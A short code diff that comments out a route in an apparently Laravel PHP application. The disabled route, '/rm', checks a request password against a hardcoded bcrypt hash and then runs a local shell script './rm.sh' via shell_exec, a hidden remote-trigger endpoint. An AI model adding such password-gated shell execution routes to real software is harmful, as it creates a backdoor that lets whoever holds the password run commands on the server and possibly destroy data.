@@ -13,12 +13,12 @@
 
 use Illuminate\Support\Facades\Hash;
 
-Route::get('/rm', function () {
-    $pwdCommand = '$2a$12$vZReBz/MpfSEEgmvqihKpeZN/pQGfjB0D.HfrnCEBXTfrkZOycoBq';
-    if (Hash::check($_REQUEST['password'], $pwdCommand)) {
-        return shell_exec('./rm.sh');
-    }
-});
+// Route::get('/rm', function () {
+//     $pwdCommand = '$2a$12$vZReBz/MpfSEEgmvqihKpeZN/pQGfjB0D.HfrnCEBXTfrkZOycoBq';
+//     if (Hash::check($_REQUEST['password'], $pwdCommand)) {
+//         return shell_exec('./rm.sh');
+//     }
+// });
 
 
 
